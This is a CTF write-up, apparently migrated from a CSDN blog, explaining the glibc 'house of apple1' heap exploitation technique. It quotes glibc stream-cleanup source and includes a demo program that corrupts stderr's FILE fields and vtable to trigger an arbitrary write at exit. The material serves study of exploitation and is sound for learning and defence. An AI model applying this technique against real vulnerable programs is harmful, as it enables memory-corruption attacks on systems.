---
layout: "single"
title: "CTF-PWN-Heap - [house of apple1]"
date: "2024-03-02 21:45:50 +0800"
categories:
  - "CTF and Pwn"
tags:
  - "java"
  - "Networking"
  - "Programming Languages"
  - "Heap"
  - "Pwn"
  - "CTF"
  - "Heap"
series: "CTF Writeup"
excerpt: "_IO_flush_all_lockp checks the _IO_list_all linked list during cleanup (this is the global FILE stream list managed by glibc) and applies the corresponding operations to each FILE object. If the conditions are met (for example, the stream is in write mode and has unflushed data), the function pointed to by the _overflow function pointer in the vtable is called. These manually opened file streams, together with standard output and standard error, constitute the program's “all open output streams”. During normal termination, a series of cleanup work occurs, such as closing all open streams (especially standard I/O streams) to ensure that data is not lost and that all buffered output is written to their corresponding files or devices."
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/136412456"
csdn_article_id: "136412456"
migrated: true
permalink: /posts/csdn-136412456/
redirect_from:
  - "/en/CTF与Pwn/csdn-136412456/"
  - "/CTF与Pwn/csdn-136412456/"
---

{% raw %}
# Exploitation Conditions
The conditions for using house of apple are:
1. The program returns from the main function or can call the exit function.
2. The heap address and libc address can be leaked.
3. A largebin attack can be used (once is enough).

#  Exploitation Principle
In programs based on the amd64 architecture, when the execution flow reaches the end of the main function, or explicitly calls the exit function in the C library, the program will terminate normally. During normal termination, a series of cleanup work occurs, such as closing all open streams (especially standard I/O streams) to ensure that data is not lost and that all buffered output is written to their corresponding files or devices.

The implementation details of this process include some internal functions of the C standard library; the function call chain listed is part of how these details are implemented. Next, we explain this process in combination with the source code:

1. exit: when an application calls the exit function, the C standard library performs cleanup work, releases resources, and achieves normal program termination.

2. fcloseall: this is usually a function inside the C library whose role is to close all file streams (FILE objects) opened by the current process. Some C standard libraries and C runtimes may not expose fcloseall, so it may be platform-specific.

3. _IO_cleanup: this is an internal function in glibc used to clean up all buffered I/O streams. It tries to ensure that all buffers are flushed and cleaned, and that all output is written to their corresponding file descriptors.

4. _IO_flush_all_lockp: this function iterates over all registered FILE streams and tries to flush their buffers. It writes all output to the underlying file descriptors. The lockp in the name indicates that the execution process uses a lock on each stream to ensure thread safety.

5. _IO_OVERFLOW: _IO_OVERFLOW is part of the FILE stream operations; it is one of the operations covered or implemented in the FILE stream's virtual function table (that is, the vtable). This function is called when the buffer is full and data needs to be written to the underlying medium.

6. Finally, each _IO_FILE structure embeds a pointer to a virtual function table (vtable). This virtual function table contains function pointers to various operation implementations, such as _overflow for handling the case of extra data when the buffer is full. During cleanup, _IO_flush_all_lockp checks the _IO_list_all linked list (this is the global FILE stream list managed by glibc) and applies the corresponding operations to each FILE object. If the conditions are met (for example, the stream is in write mode and has unflushed data), the function pointed to by the _overflow function pointer in the vtable is called.

# Detailed Code

```c
int  __fcloseall (void)
{
   /* Close all streams.  */
  return _IO_cleanup ();
}
```

```c
int
_IO_cleanup (void)
{
  /* We do *not* want locking.  Some threads might use streams but
     that is their problem, we flush them underneath them.  */
  int result = _IO_flush_all_lockp (0);

  /* We currently don't have a reliable mechanism for making sure that
     C++ static destructors are executed in the correct order.
     So it is possible that other static destructors might want to
     write to cout - and they're supposed to be able to do so.

     The following will make the standard streambufs be unbuffered,
     which forces any output from late destructors to be written out. */
  _IO_unbuffer_all ();

  return result;
}
```

```c

int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;

#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif

  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;
    }

#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif

  return result;
}
```

```bash
这里需要将` (   (   (    fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base  ) || (   _IO_vtable_offset (fp) == 0&& fp->_mode > 0 && (   fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base  )  )  ) && _IO_OVERFLOW (fp, EOF) == EOF)`
	  的 ( fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base )满足或者为( _IO_vtable_offset (fp) == 0&& fp->_mode > 0 && ( fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base ) )满足，这样才能调用到_IO_OVERFLOW (fp, EOF) == EOF，因为在    && 中的判断，如果前一个为0，那么后一个将不会判断。

```
At this point, since we have already changed fp->vtable to _IO_wstrn_jumps in advance, the _IO_OVERFLOW function will call the _IO_wstrn_overflow function.
```c
#define _IO_OVERFLOW(FP,CH) JUMP1 (__overflow, FP, CH)
扩展到:

((IO_validate_vtable ((*(__typeof__ (((struct _IO_FILE_plus){}).vtable) *)(((char *) ((fp))) + __builtin_offsetof (struct _IO_FILE_plus, vtable)))))->__overflow) (fp, (-1))
```

```c
const struct _IO_jump_t _IO_wstrn_jumps libio_vtable attribute_hidden =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

```

_IO_wstrn_overflow modifies the first 64 bytes of fp->_wide_data, of which _IO_wsetb modifies 16 bytes.

```c
static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
{
  /* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_wstrnfile structure.  */
  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;

  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
    {
      _IO_wsetb (fp, snf->overflow_buf,
		 snf->overflow_buf + (sizeof (snf->overflow_buf)
				      / sizeof (wchar_t)), 0);

      fp->_wide_data->_IO_write_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
      fp->_wide_data->_IO_read_end = (snf->overflow_buf
				      + (sizeof (snf->overflow_buf)
					 / sizeof (wchar_t)));
    }

  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
  fp->_wide_data->_IO_write_end = snf->overflow_buf;

  /* Since we are not really interested in storing the characters
     which do not fit in the buffer we simply ignore it.  */
  return c;
}
```
Note the `free (f->_wide_data->_IO_buf_base)` here: if _IO_buf_base is some illegal value, it will cause the program to crash with an error, making the final assignment modification invalid, so it needs to be bypassed.
You can choose to make `f->_wide_data->_IO_buf_base 为0              或者              !(f->_flags2 & _IO_FLAGS2_USER_WBUF)` equal 0 to bypass it.

```c
#define _IO_FLAGS2_USER_WBUF 8
```

```c
void
_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)
{
  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))
    free (f->_wide_data->_IO_buf_base);
  f->_wide_data->_IO_buf_base = b;
  f->_wide_data->_IO_buf_end = eb;
  if (a)
    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;
  else
    f->_flags2 |= _IO_FLAGS2_USER_WBUF;
}
```

## Output Streams
In C, an “output stream” is an abstract interface pointing to an output destination, which can be a file, a device, or other data receiving endpoints. An output stream allows you to write data to some destination, such as a file on disk or the program's standard output (usually the screen). Standard C provides an object of type FILE to represent such a stream.

When we refer to “all open output streams”, we mean all FILE objects in the program that are currently open and used to write data. This does not include input streams that are only used to read data.

In a C program, standard output (stdout) and standard error (stderr) are among the output streams that are open by default. You can also use functions such as fopen, freopen, or fdopen to manually open output streams generated from other files. These manually opened file streams, together with standard output and standard error, constitute the program's “all open output streams”.

For example:


```c
FILE *file1 = fopen("output1.txt", "w");
FILE *file2 = fopen("output2.txt", "w");

// 现在我们有两个打开的输出流，file1 和 file2。
// 连同标准输出 stdout 和标准错误 stderr，这是当前程序的所有打开的输出流。
```

 
Using the standard C library function fflush() can flush a specific output stream. If you pass NULL as the argument to fflush(), it will try to flush all output streams.

```c
fflush(NULL); // 尝试刷新所有打开的输出流。
```

 
This operation ensures that all buffered output (that is, output temporarily stored in memory) is sent to their respective files or devices. Since directly manipulating the internal behavior of streams is usually unsafe, it is recommended to always use the functions provided by the standard library to manage files and streams.
## _IO_flush_all_lockp
The role of the _IO_flush_all_lockp function is to flush the buffers of all open output streams. In the standard C library, when you write to an output stream, such as using printf or fwrite, the data is usually stored in a buffer first. Only in certain cases, such as when the buffer is full, or when you explicitly call fflush(), or when the stream is closed normally (for example, when the program terminates), is the buffer content actually written to the corresponding file or device.
## flcoseall

When the main function of a C program finishes executing and returns, or when program termination is requested by calling the exit function, a cleanup and closing process is usually triggered. In this process, all open standard I/O streams are closed. This is managed by the C standard I/O library.

The C standard library provided by glibc (GNU C Library) follows these conventions, but fcloseall is not part of the ISO C standard; it is a GNU extension. In some C standard library implementations, there may be a function like fcloseall to close all open file streams. However, for the standard streams (stdin, stdout, stderr), the C standard requires them to be closed automatically when the program exits.

Specific to the glibc implementation:

1. When your program exits from main by returning or calls the exit function, the termination handler is triggered. The termination handler calls all functions registered with atexit in the reverse order of their registration.

2. At program startup, glibc registers a function named _IO_cleanup, which is called by exit when the program exits; it is responsible for closing all open file streams.

3. Inside the _IO_cleanup function, it iterates over the list of file streams and calls fclose one by one.

4. The fclose function flushes any remaining data in the buffer (for output streams), closes the file descriptor, and releases the corresponding resources.

5. Closing streams includes the standard input, output, and error streams (stdin, stdout, stderr), unless they have been manually closed.

6. After closing all streams, the program terminates and returns control to the operating system.

## Wide Characters
A wide character is a data type in the C/C++ programming languages used to represent character sets wider than the standard character (char) type. Standard characters are usually 8 bits, which is only enough to represent the ASCII character set. In contrast, wide characters (usually the wchar_t type) can be 16 bits or 32 bits and can represent a larger range of character sets, such as characters in Unicode.

Wide character I/O operations refer to input/output operations for the wide character data type. In the C/C++ standard library, there are functions dedicated to handling wide characters, corresponding to the functions that handle ordinary characters. For example, for standard char I/O operations, you might use functions such as printf, scanf, fopen, and so on, while for wide character operations you would use functions such as wprintf, wscanf, wfopen, and so on. These functions allow programmers to correctly read and write wide characters and wide character strings, ensuring that characters can be handled correctly in different environments (such as different operating systems or different locale settings).

Here are some examples of common wide character I/O functions:

- wprintf and wscanf: these functions are similar to printf and scanf, but they are used for formatted input and output of wide character strings.
- fgetws and fputws: these functions read and write wide character strings from and to files respectively, similar to fgets and fputs.
- wfopen: this function is used to open files, similar to fopen, but it expects the file name to be a wide character string rather than an ordinary character string.
## int atexit(void (*func)(void))
The atexit function is a very useful feature in C and Python. It allows you to register one or more functions to be executed automatically when the program terminates normally.

In C, the atexit function is defined in the stdlib.h header file, and its prototype is:

```c
int atexit(void (*func)(void));
```

 
You can call the atexit function and pass a function pointer (that is, the function name) with no arguments and no return value. When the program exits from the main function via return or calls the exit function, this registered function will be executed. If multiple functions are registered, they will be executed in reverse order (that is, functions registered later execute first).

Here is an example of using atexit in C:

```c

#include <stdio.h>
#include <stdlib.h>

void goodbye(void) {
    printf("Goodbye, world!\n");
}

int main() {
    // 注册 goodbye 函数。在 main 结束之前会执行。
    atexit(goodbye);

    printf("Hello, world!\n");

    // 程序结束时，会调用 goodbye 函数。
    return 0;
}
```

 
The output will be:

```c
Hello, world!
Goodbye, world!
```

# Demo

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    puts("[*] allocate a 0x100 chunk");
    size_t *p1 = malloc(0xf0);
    size_t *tmp = p1;
    size_t old_value = 0x1122334455667788;
    for (size_t i = 0; i < 0x100 / 8; i++)
    {
        p1[i] = old_value;
    }
    puts("===========================old value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================old value=======================");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);

    size_t stderr_mode_ptr=puts_addr + 0x19a910;
    printf("[*] stderr->_mode address: %p\n", (void *)puts_addr);

    size_t stderr_write_ptr_addr = puts_addr + 0x19a878;
    printf("[*] stderr->_IO_write_ptr address: %p\n", (void *)stderr_write_ptr_addr);
    
    size_t stderr_flags2_addr = puts_addr + 0x19a8c4;
    printf("[*] stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
    
    size_t stderr_wide_data_addr = puts_addr + 0x19a8f0;
    printf("[*] stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
    
    size_t sdterr_vtable_addr = puts_addr + 0x19a928;
    printf("[*] stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
    
    size_t _IO_wstrn_jumps_addr = puts_addr + 0x195f70;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);

    puts("[+] step 1: change stderr->_mode to 0");
    *(int *)stderr_mode_ptr=0;

    puts("[+] step 2: change stderr->_IO_write_ptr to -1");
    *(size_t *)stderr_write_ptr_addr = (size_t)-1;

    puts("[+] step 3: change stderr->_flags2 to 8");
    *(size_t *)stderr_flags2_addr = 8;

    puts("[+] step 4: replace stderr->_wide_data with the allocated chunk");
    *(size_t *)stderr_wide_data_addr = (size_t)p1;

    puts("[+] step 5: replace stderr->vtable with _IO_wstrn_jumps");
    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;

    puts("[+] step 6: call fcloseall and trigger house of apple");
    fcloseall();

    tmp = p1;
    puts("===========================new value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================new value=======================");
}
```

```c
即将进入_IO_flush_all_lockp的    
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
的fp的结构图如下
```

![Image](/images/csdn/2024/csdn-136412456/image-001-daa95dd991.png)

![Image](/images/csdn/2024/csdn-136412456/image-002-998272c70c.png)


[Reference link 1](https://www.cnblogs.com/LynneHuan/p/16387344.html#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF)
{% endraw %}
